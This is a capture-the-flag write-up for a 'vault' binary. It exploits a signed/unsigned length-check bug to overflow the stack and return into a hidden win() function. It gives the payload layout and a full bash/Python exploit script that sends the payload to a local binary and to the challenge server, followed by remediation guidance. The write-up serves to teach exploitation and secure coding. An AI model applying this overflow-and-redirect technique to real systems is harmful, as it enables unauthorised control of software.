# Challenge - The Password is Swordfish

> **Category:** Pwn  
> **Difficulty:** Easy  
> **Event:** FluidSec CTF

## Description

The challenge provides a password-protected ZIP file containing a single executable named `vault`. Although the application appears to enforce a maximum password length, the implementation contains a logic flaw that allows an attacker to overflow the stack and redirect execution to a hidden function that prints the flag.

The exploit uses a classic **ret2win** technique by overwriting the saved return address with the address of the internal `win()` function.

---

# Challenge Files

```
public.zip
```

Password:

```
infected
```

Contents:

```
vault
```

---

# Initial Analysis

After extracting the binary, the first step was identifying its protections.

```bash
checksec vault
```

Relevant observations:

- NX enabled
- No PIE
- No Stack Canary in the vulnerable function

Since PIE is disabled, function addresses remain constant, making a ret2win attack possible.

---

# Understanding the Vulnerability

The application asks the user for the password length before reading the password itself.

Internally, the length validation and the read loop do **not** interpret the value the same way.

```
Signed validation

-1 <= 64

✔ Accepted
```

Later, the same value is treated as **unsigned** during the input loop.

```
-1

↓

0xffffffff

↓

4294967295
```

As a result, the program attempts to read far more data than the destination buffer can hold, producing a stack-based buffer overflow.

---

# Finding the Target

While reversing the binary, a hidden function was identified:

```
win()
```

Address:

```
0x401b85
```

Its only purpose is to open `/flag.txt`, read its contents and print them to the screen.

Instead of bypassing authentication, the exploit simply redirects execution to this function.

---

# Payload Construction

One important detail is that the loop counter is stored inside the stack frame.

At offset **76**, the payload overwrites the counter itself.

If arbitrary bytes are written at that position, the loop becomes unstable and the overwrite never reaches the saved return address.

To preserve normal execution, the payload restores the expected counter value.

```
Offset   Content

0-75     "A" * 76
76-79    0x4c000000
80-87    "B" * 8
88-95    win()
```

Complete payload:

```
-1
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
\x4c\x00\x00\x00
BBBBBBBB
0x401b85
```

---

# Local Verification

The exploit was first executed locally.

```bash
python3 solve.py | ./vault
```

Expected output:

```
Error: could not read flag.
```

This confirms execution successfully reached `win()`. The error only appears because the local environment does not contain `/flag.txt`.

---

# Remote Exploitation

After replacing the target host and port, the same payload was sent to the remote service.

```bash
python3 solve.py | nc HOST PORT
```

Since the remote server contains the real flag file, `win()` prints the flag successfully.

---

# Exploit Script

```bash
#!/usr/bin/env bash
set -euo pipefail

HOST="https://INSTANCE.ctf.ae/"
PORT="PORT"

ZIP_FILE="public.zip"
ZIP_PASS="infected"
BIN_NAME="vault"

echo "[+] FluidSec Vault exploit"

for tool in python3 unzip nc; do
    command -v "$tool" >/dev/null || {
        echo "[-] Missing dependency: $tool"
        exit 1
    }
done

[ -f "$ZIP_FILE" ] && unzip -P "$ZIP_PASS" -o "$ZIP_FILE" >/dev/null

chmod +x "$BIN_NAME"

cat > solve.py <<'PY'
from struct import pack
import sys

p64=lambda x:pack("<Q",x)

win=0x401b85

payload  = b"-1\n"
payload += b"A"*76
payload += b"\x4c\x00\x00\x00"
payload += b"B"*8
payload += p64(win)
payload += b"\n"

sys.stdout.buffer.write(payload)
PY

python3 solve.py | ./vault || true

python3 solve.py | nc "$HOST" "$PORT"
```

---

# Exploitation Flow

```
Extract Binary
        │
        ▼
Analyze Protections
        │
        ▼
Locate win()
        │
        ▼
Identify Integer Signedness Bug
        │
        ▼
Trigger Stack Overflow
        │
        ▼
Preserve Loop Counter
        │
        ▼
Overwrite Return Address
        │
        ▼
Jump to win()
        │
        ▼
Read /flag.txt
```

---

# Skills Demonstrated

- Binary exploitation
- Reverse engineering
- Ghidra analysis
- Integer signedness vulnerability analysis
- Stack buffer overflow
- ret2win exploitation
- Payload construction
- Local exploit validation
- Remote exploitation with Netcat

---

# Remediation

The root cause of this vulnerability is the inconsistent handling of signed and unsigned integers during input validation. Although the application limits the password length to 64 characters, supplying a negative value bypasses the signed comparison and later becomes a very large unsigned integer, allowing the input loop to overflow the stack.

The issue can be mitigated by applying the following secure coding practices:

- Reject negative values immediately after reading user input.
- Use unsigned integer types consistently when handling buffer sizes and lengths.
- Ensure the same comparison semantics are used throughout the program (avoid mixing signed and unsigned comparisons).
- Replace manual character-by-character input loops with safer functions that enforce buffer limits.
- Validate that the number of bytes read never exceeds the destination buffer size.
- Compile binaries with modern security protections such as **Stack Canaries**, **PIE**, **Full RELRO**, and **FORTIFY_SOURCE** to make exploitation significantly more difficult.

Example of safer validation:

```c
if (password_length < 0 || password_length > 64) {
    puts("Invalid password length.");
    exit(EXIT_FAILURE);
}
```

By validating the input before it is used and applying consistent integer handling, the stack overflow can be completely prevented.

# Lessons Learned

This challenge demonstrates how seemingly small implementation details can introduce critical security vulnerabilities. The root cause was not the absence of bounds checking alone, but an inconsistency in how the program interpreted the same value during different stages of execution. A signed comparison accepted a negative input, while an unsigned comparison later interpreted that value as an extremely large positive integer, ultimately enabling a stack-based buffer overflow.

Another important takeaway is the need to fully understand the memory layout of a vulnerable function before developing an exploit. During the analysis, the loop counter was found to reside within the overflowed stack frame. Overwriting it with arbitrary padding caused the exploit to fail before reaching the saved return address. Preserving the expected counter value at the correct offset allowed the overflow to continue reliably, illustrating how seemingly insignificant local variables can directly influence exploit stability.

The challenge also reinforces that modern exploit mitigations should be evaluated together rather than individually. Although the binary had **NX** enabled, the absence of **PIE** and the lack of a stack canary in the vulnerable function made a classic **ret2win** attack sufficient. Instead of injecting shellcode, the exploit redirected execution to an existing function already present in the binary, demonstrating that control-flow hijacking remains effective when code addresses are predictable.

Finally, this exercise highlights that static linking alone does not improve resistance against memory corruption vulnerabilities. While the binary contained all required libraries internally, the vulnerable logic remained exploitable because the target function was located at a fixed address. Secure software depends primarily on correct input validation, consistent integer handling, proper bounds checking, and compiler protections rather than on the linking method itself.

---

